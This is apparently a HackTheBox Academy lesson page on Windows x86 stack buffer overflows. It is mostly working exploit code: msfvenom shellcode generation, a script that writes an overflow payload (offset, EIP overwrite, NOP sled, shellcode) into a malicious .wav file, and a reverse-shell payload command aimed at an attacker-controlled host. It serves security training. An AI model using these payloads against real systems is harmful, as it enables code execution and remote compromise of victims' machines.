<!--
 // Platform: Academy
// URL: https://academy.hackthebox.com/module/89/section/949
// Platform Version: V1
// Module ID: 89
// Module Name: Stack-Based Buffer Overflows on Windows x86
// Module Difficulty: Medium
// Section ID: 949
// Section Title: Jumping to Shellcode
// Page Title: Stack-Based Buffer Overflows on Windows x86
// Page Number: 07
-->

# Jumping to Shellcode

**Module Name:** Stack-Based Buffer Overflows on Windows x86 **Page Number:** 07

#### STACK-BASED BUFFER OVERFLOWS ON WINDOWS X86

# Jumping to Shellcode

## Shellcode Generation

``` shell-session
[!bash!]$ msfvenom -l payloads | grep

...SNIP...
    windows/exec                                        Execute an arbitrary command
    windows/format_all_drives                           This payload formats all mounted disks in Windows (aka ShellcodeOfDeath). After formatting, this payload sets the volume label to the string specified in the VOLUMELABEL option. If the code is unable to access a drive for
    windows/loadlibrary                                 Load an arbitrary library path
    windows/messagebox                                  Spawns a dialog via MessageBox using a customizable title, text & icon
...SNIP...
```

``` shell-session
[!bash!]$ msfvenom -p 'windows/exec' CMD='calc.exe' -f 'python' -b '\x00'

...SNIP...
buf =  b""
buf += b"\xd9\xec\xba\x3d\xcb\x9e\x28\xd9\x74\x24\xf4\x58\x29"
buf += b"\xc9\xb1\x31\x31\x50\x18\x03\x50\x18\x83\xc0\x39\x29"
buf += b"\x6b\xd4\xa9\x2f\x94\x25\x29\x50\x1c\xc0\x18\x50\x7a"
...SNIP...
```

``` python
def exploit():
    # msfvenom -p 'windows/exec' CMD='calc.exe' -f 'python' -b '\x00'
    buf =  b""
    buf += b"\xd9\xec\xba\x3d\xcb\x9e\x28\xd9\x74\x24\xf4\x58\x29"
    ...SNIP...
    buf += b"\xfd\x2c\x39\x51\x60\xbf\xa1\xb8\x07\x47\x43\xc5"
```

## The Final Payload

``` python
from struct import pack
```

``` python
offset = 4112
    buffer = b"A"*offset
    eip = pack('<L', 0x00419D0B)
```

## Shellcode Padding

``` python
nop = b"\x90"*32
```

## Writing Payload to File

``` python
offset = 4112
    buffer = b"A"*offset
    eip = pack('<L', 0x00419D0B)
    nop = b"\x90"*32
    payload = buffer + eip + nop + buf
```

``` python
with open('exploit.wav', 'wb') as f:
        f.write(payload)
```

``` python
def exploit():
    # msfvenom -p 'windows/exec' CMD='calc.exe' -f 'python' -b '\x00'
    buf = b""
    ...SNIP...
    buf += b"\xfd\x2c\x39\x51\x60\xbf\xa1\xb8\x07\x47\x43\xc5"

    offset = 4112
    buffer = b"A"*offset
    eip = pack('<L', 0x00419D0B)
    nop = b"\x90"*32
    payload = buffer + eip + nop + buf

    with open('exploit.wav', 'wb') as f:
        f.write(payload)

exploit()
```

![https://academy.hackthebox.com/storage/modules/89/win32bof_calc.jpg](https://academy.hackthebox.com/storage/modules/89/win32bof_calc.jpg)

## Gaining Code Execution

``` shell-session
[!bash!]$ msfvenom -p 'windows/exec' CMD='cmd.exe' -f 'python' -b '\x00'

...SNIP...
buf =  b""
buf += b"\xd9\xc8\xb8\x7c\x9f\x8c\x72\xd9\x74\x24\xf4\x5d\x33"
buf += b"\xc9\xb1\x31\x83\xed\xfc\x31\x45\x13\x03\x39\x8c\x6e"
...SNIP...
```

``` shell-session
[!bash!]$ msfvenom -l payloads | grep windows | grep reverse

...SNIP...
    windows/shell/reverse_tcp                           Spawn a piped command shell (staged). Connect back to the attacker
    windows/shell/reverse_tcp_allports                  Spawn a piped command shell (staged). Try to connect back to the attacker, on all possible ports (1-65535, slowly)
    windows/shell/reverse_tcp_dns                       Spawn a piped command shell (staged). Connect back to the attacker
    windows/shell/reverse_tcp_rc4                       Spawn a piped command shell (staged). Connect back to the attacker
    windows/shell/reverse_tcp_rc4_dns                   Spawn a piped command shell (staged). Connect back to the attacker
    windows/shell/reverse_tcp_uuid                      Spawn a piped command shell (staged). Connect back to the attacker with UUID Support
    windows/shell/reverse_udp                           Spawn a piped command shell (staged). Connect back to the attacker with UUID Support
    windows/shell_reverse_tcp                           Connect back to attacker and spawn a command shell
...SNIP...
```

``` shell-session
[!bash!]$ msfvenom -p 'windows/shell_reverse_tcp' LHOST=OUR_IP LPORT=OUR_LISTENING_PORT -f 'python'

...SNIP...
buf =  b""
buf += b"\xd9\xc8\xb8\x7c\x9f\x8c\x72\xd9\x74\x24\xf4\x5d\x33"
...SNIP...
```

![https://academy.hackthebox.com/storage/modules/89/win32bof_cmd_admin.jpg](https://academy.hackthebox.com/storage/modules/89/win32bof_cmd_admin.jpg)

# 

# 

#### Questions

####